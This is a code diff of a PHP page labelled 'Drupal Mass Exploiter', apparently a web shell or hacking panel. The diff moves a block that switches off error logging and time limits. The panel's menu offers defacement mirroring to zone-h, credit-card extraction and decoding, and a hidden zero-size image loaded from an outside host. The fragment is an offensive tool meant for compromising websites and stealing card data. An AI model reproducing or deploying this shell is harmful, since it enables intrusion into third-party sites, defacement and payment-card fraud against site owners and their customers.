@@ -69,15 +69,7 @@ body {
 
 	.nolog{
 		font-size: 10px;
-		font: lime; } </style></head><body><div id="form-container"><div align="center" class="style2"><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#;border:2px inset white;">  Drupal Mass Exploiter </td></tr></table></div><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#000;border:2px inset grey;background-image:url(http://4.bp.blogspot.com/-RbaCuWyoN3c/U9-IWbh17wI/AAAAAAAAAto/I8zpRHIP0Gg/s1600/kbk29185-227a592.gif);"><html><br><br>
-<?php
-@session_start(); 
-@error_reporting(0); 
-@ini_set('error_log',NULL); 
-@ini_set('log_errors',0); 
-@ini_set('max_execution_time',0); 
-@ini_set('display_errors', 0);
-@set_time_limit(0); 
+		font: lime; } </style></head><body><div id="form-container"><div align="center" class="style2"><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#;border:2px inset white;">  Drupal Mass Exploiter </td></tr></table></div><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#000;border:2px inset grey;background-image:url(http://4.bp.blogspot.com/-RbaCuWyoN3c/U9-IWbh17wI/AAAAAAAAAto/I8zpRHIP0Gg/s1600/kbk29185-227a592.gif);"><html><br>
 echo "<table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'>
 		<tr>
 		<th class='th_home'>";
@@ -121,7 +113,15 @@ echo "| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Z
 |<a href='?dir=$dir&do=ExTrPCc'><input class='button' type='button' value=Extrap CC></a>
 <a href='?dir=$dir&do=DdCc'><input class='button' type='button' value=Decode CC></a>| ";
 echo "</ul>";
-echo "</th></tr>";
+echo "</th></tr>";<br>
+<?php
+@session_start(); 
+@error_reporting(0); 
+@ini_set('error_log',NULL); 
+@ini_set('log_errors',0); 
+@ini_set('max_execution_time',0); 
+@ini_set('display_errors', 0);
+@set_time_limit(0); 
 echo '<img src="https://3.bp.blogspot.com/-wLJw_NlOn7E/VzC1NVdwv9I/AAAAAAAAARE/DGLXUsdr8902CG_3y1zR7Em2uvadBG1IACLcB/s1600/sangar.jpg" width="0" height="0">';
 {
 echo "
